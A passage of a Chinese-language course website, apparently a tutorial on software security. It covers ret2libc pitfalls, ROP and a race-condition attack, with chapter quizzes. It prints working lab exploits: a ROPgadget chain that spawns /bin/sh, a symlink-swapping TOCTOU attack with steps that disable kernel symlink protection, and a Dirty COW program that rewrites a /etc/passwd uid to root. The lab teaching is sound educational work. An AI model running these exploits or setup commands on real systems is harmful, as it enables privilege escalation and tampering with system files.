+    <p><strong>做法</strong>：让攻击程序与目标程序<strong>同名同长</strong>（课件建议用 <code>cp</code> 改名而不是重命名），或在 gdb 里现场确认地址。<strong>易混点</strong>：这不是 ASLR——关掉 ASLR 后地址仍然会因名字长度而变。</p>
+
+    <h2>8.9 常见误解</h2>
+    <ul class="mis">
+      <li><strong>“ret2libc 还是要在栈上执行代码”</strong>——不执行，栈上只放数据（地址与字符串），执行的是 libc 里的指令。</li>
+      <li><strong>“只改返回地址就够了”</strong>——不够，还要摆返回地址之后的返回槽与参数槽，否则 <code>system</code> 拿到的是垃圾参数。</li>
+      <li><strong>“<code>/bin/sh</code> 必须由攻击者写进栈”</strong>——可以借 libc 里的字符串，也可以借环境变量区；本实验用后者。</li>
+      <li><strong>“填 <code>exit</code> 是必须的”</strong>——是工程习惯，让 shell 退出后干净收尾；不填也能拿到 shell，只是进程会崩。</li>
+      <li><strong>“偏移 112 是标准答案”</strong>——偏移由缓冲大小、对齐、canary 决定；课件示例是 108 起覆盖，本站代码是 112/116，都要用 gdb 实测。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 8 章<span>5 题</span></div>
+
+      <div class="q" data-answer="A" data-explain="ret2libc 不注入新代码，而是把返回地址改成已有库函数（system）的地址，因此 NX 挡不住它。">
+        <div class="q-stem"><span class="qno">1.</span>ret2libc 为什么能绕过 NX？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q8-1" value="A"><span>A. 它执行的是已有 libc 代码，不需要栈可执行</span></label>
+          <label class="opt"><input type="radio" name="q8-1" value="B"><span>B. 它把栈重新标记为可执行</span></label>
+          <label class="opt"><input type="radio" name="q8-1" value="C"><span>C. 它关闭了 ASLR</span></label>
+          <label class="opt"><input type="radio" name="q8-1" value="D"><span>D. 它使用 64 位地址</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="returntolibc_exploit.py 中 content[112:116] 写入 system 地址，覆盖 RET；116:120 写 exit；120:124 写 &quot;/bin/sh&quot;。">
+        <div class="q-stem"><span class="qno">2.</span>在 returntolibc_exploit.py 里，offset 112–115 写入的是什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q8-2" value="A"><span>A. exit 的地址</span></label>
+          <label class="opt"><input type="radio" name="q8-2" value="B"><span>B. system 的地址（覆盖返回地址）</span></label>
+          <label class="opt"><input type="radio" name="q8-2" value="C"><span>C. "/bin/sh" 的地址</span></label>
+          <label class="opt"><input type="radio" name="q8-2" value="D"><span>D. 保存的 ebp</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="文件注释的做法是 export MYSHELL=&quot;/bin/sh&quot;，再用 envro.c 打印该字符串在环境区的地址（0xbffffdd8）。">
+        <div class="q-stem"><span class="qno">3.</span>这批代码里，<code>"/bin/sh"</code> 的地址是怎么得到的？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q8-3" value="A"><span>A. 从 badfile 里直接搜索字符串</span></label>
+          <label class="opt"><input type="radio" name="q8-3" value="B"><span>B. 用 objdump 从 libc 中查找</span></label>
+          <label class="opt"><input type="radio" name="q8-3" value="C"><span>C. 用环境变量 MYSHELL 存放，再由 envro.c 打印地址</span></label>
+          <label class="opt"><input type="radio" name="q8-3" value="D"><span>D. 由 ROPgadget 自动生成</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="跳到 system 入口时没有调用者，RET 之后的第一格是 system 的返回地址（习惯填 exit），第二格才是 ebp+8 处的第一个参数。">
+        <div class="q-stem"><span class="qno">4.</span>把 RET 改成 <code>system</code> 地址后，紧随其后的那一格应该放什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q8-4" value="A"><span>A. <code>"/bin/sh"</code> 字符串本身</span></label>
+          <label class="opt"><input type="radio" name="q8-4" value="B"><span>B. 缓冲区首地址</span></label>
+          <label class="opt"><input type="radio" name="q8-4" value="C"><span>C. <code>system</code> 的返回地址（如 <code>exit</code>）</span></label>
+          <label class="opt"><input type="radio" name="q8-4" value="D"><span>D. 随便填，会被 system 忽略</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="程序名是 argv[0]，就压在栈顶环境区；名字长度改变会让后面的所有字符串整体位移，因此同一份代码换个名字打印出的地址就变了。这不是 ASLR。">
+        <div class="q-stem"><span class="qno">5.</span>把打印环境变量地址的程序从 <code>envro</code> 复制成 <code>e</code> 后，地址为什么会变？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q8-5" value="A"><span>A. 因为 ASLR 重新随机化了栈</span></label>
+          <label class="opt"><input type="radio" name="q8-5" value="B"><span>B. 因为程序名本身在栈顶，长度不同会挪动后面的字符串</span></label>
+          <label class="opt"><input type="radio" name="q8-5" value="C"><span>C. 因为 libc 的基址变了</span></label>
+          <label class="opt"><input type="radio" name="q8-5" value="D"><span>D. 因为编译器重新排了全局变量</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 9 章 ================= -->
+  <section class="chapter" id="ch9">
+    <div class="ch-kicker">第 9 章 · 对应《第2讲 软件安全2-4》第 49–104 页；代码来自 rop/</div>
+    <h1>ROP 返回导向编程</h1>
+    <p class="lead">当 libc 里找不到“一个函数直接满足需求”时，就把程序里已有的以 <code>ret</code> 结尾的小指令片段（gadget）串起来，像搭积木一样拼出任意逻辑。ROP 不需要可执行栈，也不需要注入代码——只需要<strong>控制栈</strong>。</p>
+
+    <div class="callout">
+      <b>为什么 ROP 能成立</b>
+      每个 gadget 末尾都有 <code>ret</code>，它从栈上取下一条地址。于是栈不再只是数据，而是一张<strong>指令地址表</strong>：控制栈就控制了执行顺序。这是第 3 章“ret 会弹出一段地址放进 EIP”的直接推论。
+    </div>
+
+    <h2>9.1 实验程序：buffer[12]</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">rop/stack.c · 第 4–18 行</span><span>C</span></div>
+      <pre data-lang="c">int vulfunc(char *str){
+ char buffer[12];
+ strcpy(buffer, str);
+ return 1;
+}
+
+int main(){
+ char str[200];
+ FILE *badfile;
+ badfile = fopen("badfile","r");
+ fread(str, sizeof(char), 400, badfile);
+ vulfunc(str);
+ printf("Returned properly\n");
+ fclose(badfile);
+ return 0;
+}</pre>
+    </div>
+    <p>与第 4 章相比只有 <code>buffer</code> 变小（12 字节），但<strong>偏移不是 16，而是 24</strong>。文件注释专门记录了这一点：用 gdb 直接量得到 33/37 的那组数据是另一份编译产物；本实验在 <code>-static</code> 编译下量得 24，并用 <code>finddistance.py</code> 交叉验证——第 24 个字节被写成 <code>0x19</code>，崩溃时 EIP 显示 <code>0x1c1b1a19</code>，反推距离 <code>0x18 = 24</code>。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">rop/finddistance.py · 第 3–10 行</span><span>Python 3</span></div>
+      <pre data-lang="python">content = bytearray(0x01 for i in range(250));
+
+for i in range(250):
+	content[i] += i
+
+badfile = open("badfile", "wb")
+badfile.write(content)
+badfile.close()</pre>
+    </div>
+    <p>它生成 <code>01 02 03 …</code> 的递增字节，崩溃时看看 EIP 是哪一个值，就知道返回地址在 payload 的哪个偏移。<strong>这是比 gdb 量栈更省事的定位方法</strong>，因为 12 字节数组在栈上会被编译器对齐、插入填充，光看源码算不出来。</p>
+
+    <h2>9.2 为什么必须静态编译</h2>
+    <p>注释里的编译命令是 <code>gcc -fno-stack-protector -z noexecstack -static -o stack stack.c</code>。静态编译把 libc 也放进可执行文件，gadget 地址在 <code>.text</code> 中<strong>固定</strong>（ASLR 只随机化库与栈，非 PIE 的 .text 不变）。这样 <code>ROPgadget --binary ./stack --ropchain</code> 找到的地址才能在运行时直接使用。</p>
+
+    <h2>9.3 由 ROPgadget 生成的链</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">rop/exploit.py · 第 1–41 行</span><span>Python 2</span></div>
+      <pre data-lang="python">from struct import pack
+
+# Padding goes here
+p = 'A'*24
+
+p += pack('&lt;I', 0x0806ef2b) # pop edx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080b8836) # pop eax ; ret
+p += '/bin'
+p += pack('&lt;I', 0x0805492b) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806ef2b) # pop edx ; ret
+p += pack('&lt;I', 0x080ea064) # @ .data + 4
+p += pack('&lt;I', 0x080b8836) # pop eax ; ret
+p += '//sh'
+p += pack('&lt;I', 0x0805492b) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x0806ef2b) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049333) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0805492b) # mov dword ptr [edx], eax ; ret
+p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
+p += pack('&lt;I', 0x080ea060) # @ .data
+p += pack('&lt;I', 0x080defc9) # pop ecx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x0806ef2b) # pop edx ; ret
+p += pack('&lt;I', 0x080ea068) # @ .data + 8
+p += pack('&lt;I', 0x08049333) # xor eax, eax ; ret
+p += pack('&lt;I', 0x0804f0b3) # inc eax ; ret</pre>
+    </div>
+    <p>把它读成三段就清楚了：</p>
+    <ol>
+      <li><strong>造字符串</strong>：用 <code>pop edx; ret</code> 把目标地址（<code>.data</code> 段）放进 edx，用 <code>pop eax; ret</code> 把 <code>"/bin"</code>、<code>"//sh"</code>、<code>0</code> 依次放进 eax，再用 <code>mov [edx], eax; ret</code> 写到内存。<code>.data</code> 可写，于是拼出 <code>"/bin//sh"</code>。</li>
+      <li><strong>设置参数</strong>：<code>pop ebx</code> 指向字符串，<code>pop ecx</code> 指向 <code>.data+8</code>（作为 argv），<code>pop edx</code> 置 0（环境变量为空）。</li>
+      <li><strong>设置调用号</strong>：<code>xor eax,eax</code> 清零，再连续 11 次 <code>inc eax</code> 得到 <code>eax = 11</code>（execve），最后跳到 <code>int 0x80</code>。</li>
+    </ol>
+    <p>注意末段的 <code>0x0806cb25 # int 0x80</code> 是一个“执行系统调用”的 gadget，并不以 ret 结尾——链在这里收尾。<code>test_execve.c</code> 是同一思路的 C 版对照：<code>execve("/bin/zsh", p1, p2)</code>。</p>
+
+    <h2>9.4 运行与观察</h2>
+    <p>文件注释给出的流程：<code>gcc -fno-stack-protector -z noexecstack -static -g -o stack_gdb stack.c</code> → 设置 SUID → <code>python2 exploit.py</code> 生成 badfile → <code>gdb ./stack</code>，在 <code>vulfunc</code> 下断点，单步走过 <code>leave</code> 后观察 <code>esp</code> 如何依次指向每一个 gadget 地址。</p>
+    <p><strong>风险点 / 前提</strong>：脚本是 <code>python2</code>，且 <code>pack('&lt;I', …)</code> 依赖固定地址；一旦换成 PIE 或 64 位，所有地址都要重找。ROP 让“栈不可执行”失效，这也是 NX 单独不足以防御的原因。</p>
+
+    <h2>9.5 课件怎么定义 ROP：把 libc 当成“指令片段的仓库”</h2>
+    <p>先看问题：ret2libc 只能借到“整个函数”，如果需要的逻辑 libc 里没有（例如“把某地址写成 0 再执行系统调用”），就卡住了。能不能<strong>不借整函数、只借一两句指令</strong>？ROP 的答案是：能，而且能拼出任意逻辑。</p>
+    <p><span class="term" data-term="g-gadget" tabindex="0"><a href="#g-gadget">gadget</a></span>（<strong>指令片段</strong>）：一段以 <code>ret</code> 结尾、长度通常 1–5 条指令的机器码。生活类比：乐高积木——单块没什么用，拼起来什么都能搭。<strong>在本章实验里</strong>：<code>pop eax; ret</code>、<code>pop ebx; ret</code>、<code>mov [edx],eax; ret</code>、<code>inc eax; ret</code> 都是 gadget，全都能在 <code>stack</code> 的 <code>.text</code> 里按字节搜到。</p>
+    <p><code>ret</code> 在这里有两个效果（2-4 第 58–60 页反复强调）：<strong>① 把栈顶的值弹出放进 EIP；② esp 上移一格</strong>。于是“栈”从数据区变成了<strong>指令地址表</strong>：你写什么地址，程序就跳去哪；跳到的 gadget 末尾又 <code>ret</code>，继续取下一个。这就是 <span class="term" data-term="g-rop" tabindex="0"><a href="#g-rop">ROP</a></span>（<strong>返回导向编程</strong>，Return-Oriented Programming）：用 <code>ret</code> 当调度器，把已有代码串成新程序。<strong>它不需要可执行栈，也不需要注入任何 <span class="term" data-term="g-shellcode" tabindex="0"><a href="#g-shellcode">shellcode</a></span></strong>。</p>
+    <div class="callout">
+      <b>一句话记住</b>
+      ret2libc 是“借整本书”，ROP 是“把书拆成句子，按自己的顺序重读”。两者的前提相同：<strong>地址可预测</strong>；不同点：ROP 不需要目标函数恰好合用。
+    </div>
+    <p><strong>易混点</strong>：gadget 不必从函数开头开始。x86 是变长指令集，同一串字节从中间某个偏移开始解码，就是另一条合法指令——正因如此，<code>pop; ret</code> 这类片段在正常代码里“俯拾皆是”。</p>
+
+    <h2>9.6 为什么拼起来能等价于任意代码</h2>
+    <p>课件第 66–76 页用一个“给变量赋值”的例子做对照，非常值得记住：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>写法</th><th>代码</th><th>问题 / 好处</th></tr>
+        <tr><td>实现 1（普通函数）</td><td><code>mov eax,[esp+4]</code>；<code>mov ebx,[esp+8]</code>；<code>mov [ebx],eax</code>；<code>ret</code></td><td>地址相关的立即数可以写死，但要求“这一段代码本来就存在”</td></tr>
+        <tr><td>实现 2（拆成 gadget）</td><td><code>pop eax; ret</code> ＋ <code>pop ebx; ret</code> ＋ <code>mov [ebx],eax; ret</code></td><td>参数与操作分开，<strong>与地址无关</strong>，可任意组合</td></tr>
+      </table>
+    </div>
+    <p>结论：ROP 是<strong>图灵完备</strong>的（课件引 Shacham 2007 的结论）——只要 gadget 足够多，就能表达任意计算。工程上的差别只是“链更长、更慢”，不是“能力更弱”。</p>
+
+    <h2>9.7 ROPgadget：从“手工找”到“工具生成”</h2>
+    <p>2-4 第 79–90 页给了一条可复现的流水线，本站 <code>rop/</code> 目录里的地址就是它的产物：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>步骤</th><th>命令</th><th>要看的结果</th></tr>
+        <tr><td>1 安装</td><td><code>pip install ROPgadget</code></td><td>能执行 <code>ROPgadget</code></td></tr>
+        <tr><td>2 生成链</td><td><code>ROPgadget --binary ./stack --ropchain</code></td><td>直接吐出一段 Python 载荷（含 <code>execve</code> 链）</td></tr>
+        <tr><td>3 验证 gadget</td><td><code>ROPgadget --binary ./stack | grep "pop eax"</code>；<code>gdb</code> 里 <code>disass</code> 核对</td><td>地址与反汇编一致，不被“伪指令”骗</td></tr>
+        <tr><td>4 找覆盖偏移</td><td>用脚本二分或 <code>gdb</code> 观察崩溃点</td><td>覆盖到 RET 的字节数（本实验 24，即 <code>0x18</code>）</td></tr>
+      </table>
+    </div>
+    <p><strong>“找偏移”那步最容易错</strong>：课件示例里崩溃地址是 <code>0x1c1b1a19</code>，由四个可控字节拼成，逐个减 1 后发现是第 25 个字节，所以真实偏移是 24——<em>减 1 是因为 ret 之后 esp 又走了一格</em>。这种“差一格”错误在手工计算里非常常见。</p>
+    <p><strong>保护设置</strong>（第 77–78 页）：NX 保持开启（这正是 ROP 要绕的）、StackGuard 关闭（否则溢出先被 canary 拦住）、ASLR 视实验而定——关掉才能用固定地址，开启则要先泄露基址。</p>
+
+    <h2>9.8 常见误解</h2>
+    <ul class="mis">
+      <li><strong>“ROP 需要栈可执行”</strong>——恰恰相反，ROP 的前提是栈不可执行；栈上只有地址。</li>
+      <li><strong>“gadget 必须是一个完整函数”</strong>——可以落在任意函数的中间，甚至跨指令边界。</li>
+      <li><strong>“静态链接能防 ROP”</strong>——不能，反而更有利：所有 gadget 都在固定地址的 <code>.text</code> 里，不用先泄露 libc（2-4 第 56、64–67 页）。</li>
+      <li><strong>“ROP 一定要用 libc”</strong>——不需要，gadget 来自程序自身的代码段；libc 只是额外货源。</li>
+      <li><strong>“链越长越强”</strong>——链只影响可靠性与体积；能力取决于可用的 gadget 集合。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 9 章<span>5 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="gadget 是以 ret 结尾的一小段指令。每执行完一段就 ret 到栈上的下一个地址，从而把已有代码串成任意逻辑。">
+        <div class="q-stem"><span class="qno">1.</span>ROP 的基本单位是什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q9-1" value="A"><span>A. shellcode</span></label>
+          <label class="opt"><input type="radio" name="q9-1" value="B"><span>B. gadget（以 ret 结尾的指令片段）</span></label>
+          <label class="opt"><input type="radio" name="q9-1" value="C"><span>C. canary</span></label>
+          <label class="opt"><input type="radio" name="q9-1" value="D"><span>D. PLT 表项</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="exploit.py 里 p = 'A'*24，说明从 buffer 起点到返回地址是 24；finddistance.py 也以第 24 字节 0x19 崩溃在 EIP 验证了 0x18 = 24。">
+        <div class="q-stem"><span class="qno">2.</span>rop/exploit.py 中 <code>p = 'A'*24</code> 的 24 表示？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q9-2" value="A"><span>A. buffer 的字节数</span></label>
+          <label class="opt"><input type="radio" name="q9-2" value="B"><span>B. shellcode 的长度</span></label>
+          <label class="opt"><input type="radio" name="q9-2" value="C"><span>C. 从 buffer 起点到返回地址的距离</span></label>
+          <label class="opt"><input type="radio" name="q9-2" value="D"><span>D. gadget 的数量</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="静态编译把库代码放进可执行文件，非 PIE 情况下 .text 地址固定，gadget 地址才可以直接硬编码进 payload。">
+        <div class="q-stem"><span class="qno">3.</span>本实验为什么要加 <code>-static</code> 编译？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q9-3" value="A"><span>A. 让 gadget 地址固定、可直接写死</span></label>
+          <label class="opt"><input type="radio" name="q9-3" value="B"><span>B. 让栈变成可执行</span></label>
+          <label class="opt"><input type="radio" name="q9-3" value="C"><span>C. 关闭 canary</span></label>
+          <label class="opt"><input type="radio" name="q9-3" value="D"><span>D. 让程序体积更小</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="ROP 依赖控制栈，不要求栈可执行；把栈标为不可执行（NX）并不会阻止 ROP。">
+        <div class="q-stem"><span class="qno">4.</span>关于 ROP 与 NX 的关系，正确的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q9-4" value="A"><span>A. NX 能完全阻止 ROP</span></label>
+          <label class="opt"><input type="radio" name="q9-4" value="B"><span>B. ROP 不需要可执行栈，因此 NX 挡不住</span></label>
+          <label class="opt"><input type="radio" name="q9-4" value="C"><span>C. ROP 必须先关闭 NX</span></label>
+          <label class="opt"><input type="radio" name="q9-4" value="D"><span>D. ROP 只在 64 位系统上可行</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+      <div class="q" data-answer="C" data-explain="静态链接把全部代码放进固定地址的 .text，gadget 无需泄露 libc 基址即可使用，所以对 ROP 反而更有利。">
+        <div class="q-stem"><span class="qno">5.</span>为什么课件说“静态链接的程序对 ROP 反而更有利”？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q9-5" value="A"><span>A. 静态程序没有 NX 保护</span></label>
+          <label class="opt"><input type="radio" name="q9-5" value="B"><span>B. 静态程序没有栈</span></label>
+          <label class="opt"><input type="radio" name="q9-5" value="C"><span>C. gadget 全在固定地址的 <code>.text</code> 里，无需先泄露基址</span></label>
+          <label class="opt"><input type="radio" name="q9-5" value="D"><span>D. 静态程序不调用 libc</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 10 章 ================= -->
+  <section class="chapter" id="ch10">
+    <div class="ch-kicker">第 10 章 · 课件大纲列出，正文未展开；代码来自 racecondition/</div>
+    <h1>竞态条件与 Dirty COW</h1>
+    <p class="lead">前九章改的是内存里的数据，这一章改的是<strong>时间</strong>：检查与使用之间有一个窗口，只要在窗口里把对象换掉，检查的结论就与使用时的事实不符。这类问题叫 TOCTOU（Time-of-Check to Time-of-Use）。</p>
+
+    <div class="callout warn">
+      <b>来源说明</b>
+      第 2 讲大纲列了“竞态条件”，但本批 PDF 没有对应正文。以下依据 <code>racecondition/</code> 下的三个 C 程序、<code>loop.sh</code> 与文件注释整理；Dirty COW 的补丁细节只按代码注释写（Ubuntu 16.04 已修复、12.04 可利用），不补充课件之外的版本时间线。
+    </div>
+
+    <h2>10.1 一个 SUID 程序的“小工具”</h2>
+    <p>程序被设计成 root 所有并带 SUID，普通用户运行时也拥有 root 权限，它可以向指定文件追加用户输入的一行内容——听起来像受限的写入工具，漏洞就在“指定文件”是<strong>一个可以被替换的符号链接</strong>。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/vulp_race_condition.c · 第 5–22 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+	char * fn = "/tmp/mylink";
+	char buffer[60];
+	FILE * fp;
+
+	scanf("%50s",buffer);
+
+	if(!access(fn, W_OK)){
+		fp = fopen(fn, "a+");
+		printf("open successfully to write\n");
+		fwrite("\n",sizeof(char), 1, fp);
+		fwrite(buffer, sizeof(char), strlen(buffer), fp);
+		fclose(fp);
+	}
+	else
+		printf("No permission\n");
+	return 0;
+}</pre>
+    </div>
+    <p>两个关键调用是分开的两步：</p>
+    <ol>
+      <li><code>access(fn, W_OK)</code>：以<strong>真实用户</strong>（调用者）的身份检查 <code>/tmp/mylink</code> 是否可写。普通用户对 <code>/tmp/myfile</code> 可写，所以检查通过。</li>
+      <li><code>fopen(fn, "a+")</code>：这一步以<strong>进程的有效用户</strong>（root，因为 SUID）打开<em>同一个路径</em>。如果两者之间 <code>/tmp/mylink</code> 被换成了指向 <code>/etc/passwd</code> 的符号链接，root 就会向 <code>/etc/passwd</code> 追加内容。</li>
+    </ol>
+
+    <h2>10.2 攻击：在窗口里反复换链接</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/attack_race_condition.c · 第 3–13 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+	while(1){
+		unlink("/tmp/mylink");
+		symlink("/tmp/myfile", "/tmp/mylink");
+		usleep(1000);
+
+		unlink("/tmp/mylink");
+		symlink("/etc/passwd", "/tmp/mylink");
+		usleep(1000);
+	}
+
+	return 0;
+}</pre>
+    </div>
+    <p>攻击者不断在“无害目标”和“<code>/etc/passwd</code>”之间切换链接。绝大多数时候程序打开的是无害文件，但只要<strong>恰好有一次</strong>落在窗口里，目标就被改了。这是概率性攻击：不追求每次成功，追求重复足够多次。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/loop.sh · 第 1–11 行</span><span>Bash</span></div>
+      <pre data-lang="bash">CHECK_FILE="ls -l /etc/passwd"
+old=$($CHECK_FILE)
+new=$($CHECK_FILE)
+
+while [ "$old" == "$new" ]
+do
+	./vulp_race_condition &lt; passwd_input
+	new=$($CHECK_FILE)
+done
+echo "STOP...The /etc/passwd file has been changed"</pre>
+    </div>
+    <p>脚本用 <code>ls -l</code> 的输出来判断文件是否被改，一旦变化就停止。名下还有一个 <code>passwd_input</code> 文件，保存要追加的那一行内容。</p>
+
+    <h2>10.3 运行步骤（来自文件注释）</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/ 文件内注释整理</span><span>Shell</span></div>
+      <pre data-lang="bash">gcc vulp_race_condition.c -o vulp_race_condition
+gcc attack_race_condition.c -o attack_race_condition
+sudo chown root vulp_race_condition
+sudo chmod 4755 vulp_race_condition
+
+sudo rm /tmp/mylink /tmp/myfile
+touch /tmp/mylink /tmp/myfile
+sudo sysctl -w fs.protected_symlinks=0
+
+bash ./loop.sh          # 终端 1
+./attack_race_condition # 终端 2</pre>
+    </div>
+    <p>注释还解释了为什么要关保护：<code>/tmp</code> 全局可写，内核用<strong>粘滞位保护</strong>限制“只有文件所有者、目录所有者或 root 才能重命名/删除目录中的文件”，并规定“符号链接只有在所有者、跟随者与目录所有者之一匹配时才会被跟随”。<code>fs.protected_symlinks=1</code> 开启保护（默认），<code>=0</code> 关闭——实验正是要把它关掉，才能让攻击者随意替换链接。</p>
+    <p style="color:var(--muted);font-size:14px">防御视角：真实系统不应关闭该保护；更根本的修法是避免“按路径检查、再按路径使用”，改为打开一次文件描述符后用 <code>faccessat</code>/<code>fchmod</code> 等基于 fd 的操作（此句为通用原则，课件未展开）。</p>
+
+    <h2>10.4 Dirty COW：只读文件也会被写</h2>
+    <p>COW（Copy-On-Write）的本意是：<code>MAP_PRIVATE</code> 私有映射只有在真正写入时才复制一份页，未写入时与文件共享同一物理页。<code>readonly.c</code> 先演示“正常情况下写不进去，<code>madvise</code> 之后又恢复原样”：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/cow/readonly.c · 第 9–38 行（节选）</span><span>C</span></div>
+      <pre data-lang="c">char *content="**New content**";
+char buffer[30];
+struct stat st;
+void *map;
+
+int f=open("./zzz", O_RDONLY);
+fstat(f,&amp;st);
+map=mmap (NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+// Open the process' s memory pseudo-file
+int fm=open ("/proc/self/mem", O_RDWR);
+
+// Start at the 5th byte from the beginning.
+lseek (fm, (off_t) map + 5,SEEK_SET);
+
+// Write to the memory
+write (fm, content, strlen (content) );
+
+// Check whether the write is successful
+memset(buffer,0,strlen(buffer));
+memcpy (buffer, map, 29);
+printf ("Content after write: %s\n", buffer);
+
+// Check content after madvise
+madvise (map, st.st_size, MADV_DONTNEED);
+memset(buffer,0,strlen(buffer));
+memcpy (buffer, map, 29);
+printf ("Content after madvise: %s\n", buffer);</pre>
+    </div>
+    <p>第一次打印能看到“写成功”的假象（私有副本被改），<code>madvise(MADV_DONTNEED)</code> 丢弃私有页后，再次读到的又是文件原内容——说明改动并没有落进文件。Dirty COW 的漏洞在于：内核在<strong>“建立 COW 私有页”与“从 <code>/proc/self/mem</code> 写入”</strong>之间存在竞态，反复竞争可以让写入落到<strong>只读映射背后的原始物理页</strong>，从而改掉只读文件。</p>
+    <p>武器化版本用两个线程把竞态拉满：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">racecondition/cow/cow_attack_password.c · 第 11–53 行（节选）</span><span>C</span></div>
+      <pre data-lang="c">void *writeThread(void *arg){
+    char * content = "test:x:0000";
+    off_t offset = (off_t) arg;
+    int f = open("/proc/self/mem", O_RDWR);
+
+    while(1){
+        lseek(f, offset, SEEK_SET);
+        write(f, content, strlen(content));
+        printf("writeThread\n");
+    }
+}
+
+void *madviseThread(void *arg){
+    int file_size = (int) arg;
+    while(1){
+        madvise(map, file_size, MADV_DONTNEED);
+        printf("madviseThread\n");
+    }
+}
+
+int main(int argc, char ** argv){
+    ...
+    int f = open("/etc/passwd", O_RDONLY);
+    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+    char *position = strstr(map, "test:x:1008");
+    pthread_create(&amp;pth1, NULL, madviseThread, (void *)file_size);
+    pthread_create(&amp;pth2, NULL, writeThread, position);
+    ...
+}</pre>
+    </div>
+    <p>一个线程不停 <code>madvise(MADV_DONTNEED)</code>（丢弃私有页，逼内核回到文件页），另一个线程不停向 <code>/proc/self/mem</code> 对应偏移写 <code>"test:x:0000"</code>。目标是 <code>/etc/passwd</code> 中含 <code>test:x:1008</code> 的那一行；一旦命中，该账号的 uid 变成 0000（root）。</p>
+    <div class="callout warn">
+      <b>运行前提与风险</b>
+      <code>gcc cow_attack_password.c -o cow_attack_password -lpthread</code>；以 root 运行（要写 <code>/etc/passwd</code>）。文件注释明确：<strong>Ubuntu 16.04 已修复，12.04 可利用</strong>。在现代内核上跑不出效果是正常的；<code>readonly.c</code> 里的 <code>./zzz</code> 需要事先准备。
+    </div>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li>竞态不等于“多线程 bug”：本例是单线程程序 + 外部进程改文件系统，本质是<strong>检查与使用不在同一原子操作里</strong>。</li>
+      <li><code>access()</code> 用真实 uid，<code>fopen()</code> 用有效 uid；SUID 程序里两者可能不同，这是权限被“跳过”的原因。</li>
